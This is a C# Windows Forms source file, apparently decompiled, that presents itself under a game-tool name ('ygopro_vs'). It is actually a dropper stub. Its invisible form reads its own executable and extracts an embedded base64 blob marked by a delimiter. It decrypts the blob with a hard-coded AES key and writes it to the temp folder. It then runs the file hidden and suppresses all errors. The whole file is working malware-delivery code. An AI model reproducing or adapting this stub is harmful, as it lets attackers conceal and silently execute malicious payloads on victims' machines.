using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.IO;
using System.Runtime.CompilerServices;
using System.Security.Cryptography;
using System.Windows.Forms;
using Microsoft.VisualBasic;
using Microsoft.VisualBasic.CompilerServices;
using Microsoft.VisualBasic.Devices;
using ygopro_vs.My;

namespace ygopro_vs;

[DesignerGenerated]
public class Form1 : Form
{
	private static List<WeakReference> __ENCList = new List<WeakReference>();

	private IContainer components;

	[DebuggerNonUserCode]
	public Form1()
	{
		((Form)this).add_Load((EventHandler)Form1_Load);
		__ENCAddToList(this);
		InitializeComponent();
	}

	[DebuggerNonUserCode]
	private static void __ENCAddToList(object value)
	{
		checked
		{
			lock (__ENCList)
			{
				if (__ENCList.Count == __ENCList.Capacity)
				{
					int num = 0;
					int num2 = __ENCList.Count - 1;
					int num3 = 0;
					while (true)
					{
						int num4 = num3;
						int num5 = num2;
						if (num4 > num5)
						{
							break;
						}
						WeakReference weakReference = __ENCList[num3];
						if (weakReference.IsAlive)
						{
							if (num3 != num)
							{
								__ENCList[num] = __ENCList[num3];
							}
							num++;
						}
						num3++;
					}
					__ENCList.RemoveRange(num, __ENCList.Count - num);
					__ENCList.Capacity = __ENCList.Count;
				}
				__ENCList.Add(new WeakReference(RuntimeHelpers.GetObjectValue(value)));
			}
		}
	}

	[DebuggerNonUserCode]
	protected override void Dispose(bool disposing)
	{
		try
		{
			if ((disposing && components != null) ? true : false)
			{
				components.Dispose();
			}
		}
		finally
		{
			((Form)this).Dispose(disposing);
		}
	}

	[DebuggerStepThrough]
	private void InitializeComponent()
	{
		((Control)this).SuspendLayout();
		SizeF autoScaleDimensions = new SizeF(6f, 13f);
		((ContainerControl)this).set_AutoScaleDimensions(autoScaleDimensions);
		((ContainerControl)this).set_AutoScaleMode((AutoScaleMode)1);
		Size clientSize = new Size(0, 0);
		((Form)this).set_ClientSize(clientSize);
		((Form)this).set_ControlBox(false);
		((Control)this).set_Enabled(false);
		((Form)this).set_FormBorderStyle((FormBorderStyle)0);
		((Form)this).set_MaximizeBox(false);
		((Form)this).set_MinimizeBox(false);
		((Control)this).set_Name("Form1");
		((Form)this).set_Opacity(0.0);
		((Form)this).set_ShowIcon(false);
		((Form)this).set_ShowInTaskbar(false);
		((Form)this).set_SizeGripStyle((SizeGripStyle)2);
		((Control)this).ResumeLayout(false);
	}

	public byte[] DeCrypt(byte[] data)
	{
		byte[] salt = new byte[9] { 4, 5, 2, 7, 9, 3, 1, 8, 6 };
		Rfc2898DeriveBytes rfc2898DeriveBytes = new Rfc2898DeriveBytes("22B6AD8CA0C8230EF1F22B6AD8CA0C8230EF1DFEF1A7FB91201EF1A7FB91201FC21A4F6", salt);
		using RijndaelManaged rijndaelManaged = new RijndaelManaged();
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(rijndaelManaged.IV.Length);
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.Key.Length);
		return rijndaelManaged.CreateDecryptor().TransformFinalBlock(data, 0, data.Length);
	}

	[MethodImpl(MethodImplOptions.NoOptimization)]
	private void Form1_Load(object sender, EventArgs e)
	{
		((Control)this).Hide();
		try
		{
			string temp = ((ServerComputer)MyProject.Computer).get_FileSystem().get_SpecialDirectories().get_Temp();
			string[] array = Strings.Split(File.ReadAllText(Application.get_ExecutablePath()), "EE5175F70167FE272B0C", -1, (CompareMethod)0);
			byte[] array2 = DeCrypt(Convert.FromBase64String(array[1]));
			((ServerComputer)MyProject.Computer).get_FileSystem().WriteAllBytes(temp + array[2], array2, false);
			Interaction.Shell(temp + array[2], (AppWinStyle)2, false, -1);
			ProjectData.EndApp();
		}
		catch (Exception projectError)
		{
			ProjectData.SetProjectError(projectError);
			ProjectData.ClearProjectError();
		}
	}
}
